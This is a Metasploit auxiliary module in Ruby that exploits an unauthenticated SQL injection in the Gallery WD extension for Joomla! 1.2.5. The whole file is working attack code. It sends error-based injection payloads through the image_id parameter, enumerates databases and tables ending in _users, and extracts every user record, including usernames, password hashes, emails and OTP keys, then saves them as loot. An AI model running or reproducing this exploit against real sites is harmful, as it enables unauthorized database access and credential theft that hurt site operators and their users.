##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Unauthenticated SQL Injection Gallery WD for Joomla! User Enumeration',
      'Description'    => %q{This module enumerates usernames and passwords hashes on vulnerable instances.

      This module will enumerate users from a Joomla! database using an unauthenticated SQL injection
      within Gallery WD for Joomla! 1.2.5.

      Categories: Joomla, SQL Injection

      Price: 2

      Video: none

      OS: Multi

      Arch: Multi

      Requirements: Metasploit Framework
      },
      'License'        => 'VolatileMinds',
      'Author'         =>
        [
          'Brandon Perry',
        ],
      'References'     =>
        [
          ['EDB', '36563']
        ],
      'DisclosureDate' => 'Mar 30 2015'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base Joomla directory path", '/']),
      ], self.class)
  end

  def check
    front_marker = Rex::Text.rand_text_alpha(6)
    back_marker = Rex::Text.rand_text_alpha(6)
    flag = Rex::Text.rand_text_alpha(5)

    payload = "AND (SELECT 2425 FROM(SELECT COUNT(*),CONCAT(0x#{front_marker.unpack("H*")[0]},0x#{flag.unpack("H*")[0]},0x#{back_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"

    resp = send_injected_request(payload)

    if !resp or !resp.body
      return Exploit::CheckCode::Safe
    end

    get_flag = /#{front_marker}(.*)#{back_marker}/.match(resp.body)

    if !get_flag
      return Exploit::CheckCode::Safe
    end

    return Exploit::CheckCode::Vulnerable
  end

  def run

    left_marker = Rex::Text.rand_text_alpha(5)
    right_marker = Rex::Text.rand_text_alpha(5)

    db_count_payload = "AND (SELECT 5335 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"

    res = send_injected_request(db_count_payload)

    unless res and res.body
      fail_with(Failure::Unknown, "Server did not respond in an expected way")
    end

    db_count = $1.to_i if res.body =~ /#{left_marker}(.*)#{right_marker}/

    dbs = []
    0.upto(db_count-1) do |i|
      get_db_payload = "AND (SELECT 7336 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,50) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT #{i},1),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"

      res = send_injected_request(get_db_payload)

      unless res and res.body
        fail_with(Failure::Unknown, "Server did not respond in an expected way")
      end

      dbs << $1 if res.body =~ /#{left_marker}(.*)#{right_marker}/
    end

    dbs.delete('mysql')
    dbs.delete('information_schema')
    dbs.delete('performance_schema')

    users = []

    dbs.each do |db|
      tables = []

      table_count_payload = "AND (SELECT 1539 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{db.unpack("H*")[0]})),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"

      res = send_injected_request(table_count_payload)

      unless res and res.body
        fail_with(Failure::Unknown, "Server did not respond in an expected way")
      end

      table_count = $1.to_i if res.body =~ /#{left_marker}(.*)#{right_marker}/

      0.upto(table_count-1) do |i|
        get_table_payload = "AND (SELECT 4817 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT MID((IFNULL(CAST(table_name AS CHAR),0x20)),1,50) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{db.unpack("H*")[0]}) LIMIT #{i},1),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"

        res = send_injected_request(get_table_payload)

        unless res and res.body
          fail_with(Failure::Unknown, "Server did not respond in an expected way")
        end

        table = $1 if res.body =~ /#{left_marker}(.*)#{right_marker}/

        tables << table if table =~ /_users$/

      end

      tables.each do |table|
        cols = ["id", "name", "otep", "email", "block", "otpKey", "params", "username", "password", "sendEmail", "activation", "resetCount", "registerDate", "requireReset", "lastResetTime", "lastvisitDate"]

        user_count_payload = "AND (SELECT 9849 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM #{db}.#{table}),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"

        res = send_injected_request(user_count_payload)

        unless res and res.body
          fail_with(Failure::Unknown, "Server did not respond in an expected way")
        end

        user_count = $1.to_i if res.body =~ /#{left_marker}(.*)#{right_marker}/

        0.upto(user_count-1) do |i|
          user = {}
          cols.each do |col|
            user[col] = get_value(db, table, col, i)
          end
          users << user
        end
      end
    end

     path = store_loot('joomla_users', "text/plain", datastore['RHOST'], users.to_json, "joomla_users.txt", "Joomla! users for #{datastore['RHOST']}")
     print_good("Users saved to json file: " + path)
  end

  def get_value(db, table, column, user)
    val = ''
    left_marker = Rex::Text.rand_text_alpha(5)
    right_marker = Rex::Text.rand_text_alpha(5)

    offset = 1
    while true
      get_value_payload = "AND (SELECT 7607 FROM(SELECT COUNT(*),CONCAT(0x#{left_marker.unpack("H*")[0]},(SELECT MID((IFNULL(CAST(#{column} AS CHAR),0x20)),#{offset},50) FROM #{db}.#{table} ORDER BY id LIMIT #{user},1),0x#{right_marker.unpack("H*")[0]},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"

      res = send_injected_request(get_value_payload)

      unless res and res.body
        fail_with(Failure::Unknown, "Server did not respond in an expected way")
      end

      read = $1 if res.body =~ /#{left_marker}(.*)#{right_marker}/
      val << read
      break if read.length < 50
      offset = offset + 50
    end

    return val
  end

  def send_injected_request(payload)
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'method' => 'POST',
      'vars_get' => {
        'option' => 'com_gallery_wd',
        'view' => 'gallerybox',
        'image_id' => '-1',
        'gallery_id' => '-1',
        'thumb_width' => '180',
        'thumb_height' => '90',
        'open_with_fullscreen' => 0,
        'image_width' => 800,
        'image_height' => 500,
        'image_effect' => 'fade',
        'sort_by' => 'order',
        'order_by' => 'asc',
        'enable_image_filmstrip' => '',
        'image_filmstrip_height' => 0,
        'enable_image_ctrl_btn' => 1,
        'enable_image_fullscreen' => 1,
        'popup_enable_info' => 1,
        'popup_info_always_show' => 0,
        'popup_hit_counter' => 0,
        'popup_enable_rate' => 0,
        'slideshow_interval' => 5,
        'enable_comment_social' => '',
        'enable_image_facebook' => '',
        'enable_image_twitter' => '',
        'enable_image_google' => '',
        'enable_image_pinterest' => '',
        'enable_image_tumblr' => '',
        'watermark_type' => 'none'
      },
      'vars_post' => {
        'image_id' => "1 " + payload,
        'rate' => '',
        'ajax_task' => 'save_hit_count',
        'task' => 'gallerybox.ajax_search'
      }
    })

    return res
  end
end

